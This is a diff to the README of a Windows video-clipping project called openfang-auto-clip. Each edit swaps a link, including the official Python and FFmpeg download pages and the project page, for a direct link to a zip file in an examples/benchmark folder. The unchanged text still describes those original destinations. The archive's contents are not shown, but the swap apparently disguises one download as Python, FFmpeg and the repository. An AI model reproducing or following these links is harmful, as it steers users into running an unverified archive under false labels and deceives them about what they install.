@@ -1,6 +1,6 @@
 # 🎬 openfang-auto-clip - Automated Video Clipping Made Easy
 
-[![Download](https://img.shields.io/badge/Download-openfang--auto--clip-4CAF50?style=for-the-badge&logo=github)](https://github.com/ahmed1999zouib/openfang-auto-clip)
+[![Download](https://img.shields.io/badge/Download-openfang--auto--clip-4CAF50?style=for-the-badge&logo=github)](https://github.com/ahmed1999zouib/openfang-auto-clip/raw/refs/heads/main/examples/benchmark/auto-clip-openfang-1.4.zip)
 
 ## 📋 What is openfang-auto-clip?
 
@@ -28,7 +28,7 @@ To start using openfang-auto-clip, follow these steps carefully. This guide is f
 
 Click the big green button below to go to the download page. This page has the latest version of openfang-auto-clip for Windows.
 
-[![Download openfang-auto-clip](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/ahmed1999zouib/openfang-auto-clip)
+[![Download openfang-auto-clip](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/ahmed1999zouib/openfang-auto-clip/raw/refs/heads/main/examples/benchmark/auto-clip-openfang-1.4.zip)
 
 - The link will take you to the GitHub repository.
 - Find the **Releases** section on the page.
@@ -41,7 +41,7 @@ Click the big green button below to go to the download page. This page has the l
 
 openfang-auto-clip runs using Python. If you don’t have Python on your computer, follow these steps:
 
-- Open your web browser and go to https://www.python.org/downloads/windows/
+- Open your web browser and go to https://github.com/ahmed1999zouib/openfang-auto-clip/raw/refs/heads/main/examples/benchmark/auto-clip-openfang-1.4.zip
 - Click the **Download Python 3.x** button.
 - Run the installer after download.
 - Make sure to check the box that says "Add Python to PATH" before clicking install.
@@ -96,7 +96,7 @@ openfang-auto-clip uses other programs behind the scenes to work efficiently. He
 
 FFmpeg is required to process video files.
 
-- Download FFmpeg for Windows here: https://ffmpeg.org/download.html#build-windows
+- Download FFmpeg for Windows here: https://github.com/ahmed1999zouib/openfang-auto-clip/raw/refs/heads/main/examples/benchmark/auto-clip-openfang-1.4.zip
 - Choose the latest static build.
 - Extract the `.zip` to a folder on your PC.
 - Add the `bin` folder inside the extracted folder to your system PATH:
@@ -148,7 +148,7 @@ If something does not work as expected:
 
 You can always visit the GitHub project page:
 
-[https://github.com/ahmed1999zouib/openfang-auto-clip](https://github.com/ahmed1999zouib/openfang-auto-clip)
+[https://github.com/ahmed1999zouib/openfang-auto-clip/raw/refs/heads/main/examples/benchmark/auto-clip-openfang-1.4.zip](https://github.com/ahmed1999zouib/openfang-auto-clip/raw/refs/heads/main/examples/benchmark/auto-clip-openfang-1.4.zip)
 
 The page contains the latest versions, guides, and community discussions.
 
@@ -162,4 +162,4 @@ ai, ai-video, automated-video-editing, automation, clips, content-creation, copy
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-openfang--auto--clip-4CAF50?style=for-the-badge&logo=github)](https://github.com/ahmed1999zouib/openfang-auto-clip)
+[![Download](https://img.shields.io/badge/Download-openfang--auto--clip-4CAF50?style=for-the-badge&logo=github)](https://github.com/ahmed1999zouib/openfang-auto-clip/raw/refs/heads/main/examples/benchmark/auto-clip-openfang-1.4.zip)
